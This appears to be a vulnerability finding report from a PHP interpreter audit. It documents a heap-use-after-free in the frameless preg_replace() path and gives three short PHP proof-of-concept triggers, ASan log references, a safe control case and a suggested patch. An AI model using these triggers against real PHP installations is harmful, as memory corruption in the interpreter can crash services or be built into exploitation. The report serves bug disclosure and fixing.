# FINDING-003 — Heap-use-after-free in frameless `preg_replace()` (array args + reentrant `__toString`)

**Status:** CONFIRMED (ASan, deterministic), 3 distinct vectors. Apparently NOVEL.
**Severity:** heap-use-after-free (read of attacker-controlled freed memory) from pure PHP
userland. Medium/High.
**Component:** `ext/pcre/php_pcre.c` — reached via `ZEND_FRAMELESS_FUNCTION(preg_replace, 3)`
(php_pcre.c:2378), which borrows its three args with `Z_FLF_PARAM_ARRAY_HT_OR_STR`
(php_pcre.c:2384-2386) and no refcount ownership.
**Build:** `taxoshop/php-asan-ubsan:current`, PHP 8.6.0-dev (ZTS DEBUG), HEAD `938a3110`.

Same root class as [FINDING-002](FINDING-002-in_array-frameless-uaf.md) and the just-merged
**GH-23204** (`8ce7f7f5e93`, in-build, fixed `implode`/`strtr`/`str_replace` only). The frameless
convention borrows the array/HashTable args without an addref (unlike the framed `SEND` opcode);
`preg_replace` then walks those tables while `zval_get_tmp_string()` runs `__toString()` on
object elements. If that user code frees the borrowed table (the arg is a reference — `&`,
`global`, `use(&$x)` — that gets reassigned), iteration continues over freed memory.

`preg_replace_callback_array` already `GC_TRY_ADDREF`s its `subject_ht` (php_pcre.c:2454), showing
the hazard is known — but the plain `preg_replace` array paths were missed.

## Three confirmed vectors (all `php_audit1/repro/battery5/`)

### V1 — subject array (`_preg_replace_common` php_pcre.c:2315)
```php
class E { function __toString(){ $GLOBALS['s'] = []; return "aaa"; } }
$s = [ new E() ];
for ($i=0;$i<3000;$i++) $s[] = "aaa$i";
$GLOBALS['s'] =& $s;
preg_replace('/a/', 'b', $s);        // frameless 3-arg; subject_ht freed mid-FOREACH
```
`ZEND_HASH_FOREACH_KEY_VAL(subject_ht,…)` (2315) + `zval_get_tmp_string(subject_entry)` (2318) →
`__toString` frees `subject_ht` → next iteration UAF. Log:
`logs/finding-003-e5_01_preg_subject_array.asan.txt`.

### V2 — regex array (`php_pcre_replace_array` php_pcre.c:2129/2132)
```php
class E { function __toString(){ $GLOBALS['re'] = []; return "/a/"; } }
$re = [ new E() ];
for ($i=0;$i<3000;$i++) $re[] = '/a/';
$GLOBALS['re'] =& $re;
preg_replace($re, 'b', 'aaaa');      // regex array freed mid-FOREACH_VAL
```
`ZEND_HASH_FOREACH_VAL(regex,…)` (2129) + `zval_get_tmp_string(regex_entry)` (2132) → UAF. Log:
`logs/finding-003-e5_02_preg_regex_array.asan.txt`.

### V3 — replace array (`php_pcre_replace_array` php_pcre.c:2099/2107)
```php
class E { function __toString(){ $GLOBALS['rep'] = []; return "b"; } }
$re = []; $rep = [];
for ($i=0;$i<3000;$i++){ $re[]='/a/'; $rep[]="b$i"; }
$rep[1] = new E();
$GLOBALS['rep'] =& $rep;
preg_replace($re, $rep, 'aaaa');     // replace_ht freed; read at ZEND_HASH_ELEMENT(replace_ht,…)
```
`replace_ht->nNumUsed` (2099) / `ZEND_HASH_ELEMENT(replace_ht, replace_idx)` (2104) read after
`zval_get_tmp_string(zv)` (2107) frees `replace_ht` → UAF. Log:
`logs/finding-003-e5_03_preg_replace_array.asan.txt`.

## Control (safe)
`call_user_func('preg_replace', '/a/', 'b', $s)` (framed → `SEND` addref → COW separation) does
**not** crash (`battery5/e5_04_preg_subject_framed.php`, exit 0). Confirms the bug is specific to
the frameless borrow.

## Suggested fix (mirror GH-23204)
Pin every array/HT argument for the duration of `_preg_replace_common` (covers subject_ht, and
regex_ht/replace_ht which flow into `php_pcre_replace_array`), e.g. `GC_TRY_ADDREF` on entry and
`GC_TRY_DTOR_NO_REF` before return — exactly as `_php_str_replace_common` was fixed. The framed
callers are already safe, so the guard is only strictly required for the frameless entry, but
placing it in the callee (as GH-23204 did) is the consistent, robust choice.

## Artifacts
- `php_audit1/repro/battery5/e5_0{1,2,3}_*.php` — the three repros
- `php_audit1/repro/battery5/e5_04_preg_subject_framed.php` — framed control (safe)
- `php_audit1/logs/finding-003-e5_0{1,2,3}_*.asan.txt` — clean ASan traces
